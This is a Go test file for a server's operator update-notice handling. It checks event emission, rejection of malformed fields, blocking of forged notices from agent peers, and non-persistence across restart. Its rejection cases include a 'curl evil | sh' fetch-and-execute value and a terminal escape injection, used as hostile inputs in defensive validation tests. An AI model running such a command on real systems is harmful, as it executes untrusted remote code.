//go:build linux

package server

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/pairtask/pairtask/internal/protocol"
)

func manualOperatorNotice() map[string]any {
	now := time.Now().UTC().Add(-time.Minute).Format(time.RFC3339)
	return map[string]any{"state": "update_available", "action": "upgrade_app",
		"app_release": "workspace-v0.0.0-build.99.1", "app_commit": strings.Repeat("a", 40),
		"host_release": "workspace-v0.0.0-build.100.1", "available_release": "workspace-v0.0.0-build.100.1",
		"checked_at": now, "observed_at": now}
}

func manualOperatorSet(t *testing.T, f *operatorFixture, notice map[string]any) sessionWire {
	t.Helper()
	p := &sessionProbe{operatorPeer: operatorDial(t, f.operator)}
	p.send(map[string]any{"type": "operator_update_notice", "message_id": "update-check", "update_notice": notice})
	return p.frame()
}

func manualOperatorSnapshot(t *testing.T, p *sessionProbe) sessionWire {
	t.Helper()
	response, _ := p.request(protocol.TypeOperatorSnapshot, nil)
	operatorEqual(t, "snapshot response", response.text("type"), protocol.TypeOperatorSnapshot)
	var snapshot sessionWire
	operatorNoError(t, json.Unmarshal(response["snapshot"], &snapshot))
	return snapshot
}

func TestManualUpdateOperatorAcceptanceOneShotPreservesHumanSessionAndEmitsEvent(t *testing.T) {
	f := newOperatorFixture(t, os.Getuid(), "")
	p := sessionOpen(f)
	initial := manualOperatorSnapshot(t, p)
	operatorEqual(t, "initial notice absent", len(initial["update_notice"]) == 0 || string(initial["update_notice"]) == "null", true)
	response := manualOperatorSet(t, f, manualOperatorNotice())
	operatorEqual(t, "host notice accepted", response.text("type"), "operator_update_notice_result")
	event := p.frame()
	operatorEqual(t, "informational event", event.text("type"), protocol.TypeEvent)
	var body sessionWire
	operatorNoError(t, json.Unmarshal(event["event"], &body))
	operatorEqual(t, "notice event", body.text("kind"), "update_notice_changed")
	snapshot := manualOperatorSnapshot(t, p)
	var notice sessionWire
	operatorNoError(t, json.Unmarshal(snapshot["update_notice"], &notice))
	operatorEqual(t, "notice retained", notice.text("available_release"), "workspace-v0.0.0-build.100.1")
}

func TestManualUpdateOperatorAcceptanceRejectsMalformedAndExecutableFields(t *testing.T) {
	f := newOperatorFixture(t, os.Getuid(), "")
	accepted := manualOperatorSet(t, f, manualOperatorNotice())
	operatorEqual(t, "feature supported before malformed controls", accepted.text("type"), "operator_update_notice_result")
	cases := []struct{ key, value string }{
		{"action", "curl evil | sh"}, {"state", "auto_upgrade"}, {"command", "pk upgrade"},
		{"available_state", "trusted_forever"},
		{"app_release", "workspace-v0.0.0-build.99.1\x1b[2J"}, {"app_commit", strings.Repeat("x", 40)},
		{"observed_at", "not a time"}, {"checked_at", time.Now().Add(time.Hour).UTC().Format(time.RFC3339)},
		{"available_release", strings.Repeat("x", 1500)},
	}
	for _, item := range cases {
		t.Run(item.key+"-"+item.value[:1], func(t *testing.T) {
			notice := manualOperatorNotice()
			notice[item.key] = item.value
			response := manualOperatorSet(t, f, notice)
			operatorEqual(t, "malformed notice rejected", response.text("type"), "error")
		})
	}
}

func TestManualUpdateOperatorAcceptanceAgentCannotPublishHostNotice(t *testing.T) {
	f := newOperatorFixture(t, os.Getuid(), "")
	response := manualOperatorSet(t, f, manualOperatorNotice())
	operatorEqual(t, "feature supported before role control", response.text("type"), "operator_update_notice_result")
	peer := f.peer("agent-update", protocol.Version)
	forged := manualOperatorNotice()
	forged["available_release"] = "workspace-v0.0.0-build.999.1"
	operatorNoError(t, json.NewEncoder(peer.Conn).Encode(map[string]any{
		"type": "operator_update_notice", "message_id": "forged", "update_notice": forged}))
	operatorEqual(t, "agent operation rejected", peer.read().Type, "error")
	p := sessionOpen(f)
	snapshot := manualOperatorSnapshot(t, p)
	var notice sessionWire
	operatorNoError(t, json.Unmarshal(snapshot["update_notice"], &notice))
	operatorEqual(t, "agent cannot overwrite host report", notice.text("available_release"), "workspace-v0.0.0-build.100.1")
}

func TestManualUpdateOperatorAcceptanceRestartDoesNotRestoreStaleNotice(t *testing.T) {
	database := filepath.Join(t.TempDir(), "shared.db")
	f := newOperatorFixture(t, os.Getuid(), database)
	response := manualOperatorSet(t, f, manualOperatorNotice())
	operatorEqual(t, "host notice accepted", response.text("type"), "operator_update_notice_result")
	// A new broker hub over the same database models a restart without a
	// migration or persistent record carrying the informational notice over.
	restarted := newOperatorFixture(t, os.Getuid(), database)
	snapshot := manualOperatorSnapshot(t, sessionOpen(restarted))
	operatorEqual(t, "stale notice not persisted", len(snapshot["update_notice"]) == 0 || string(snapshot["update_notice"]) == "null", true)
}
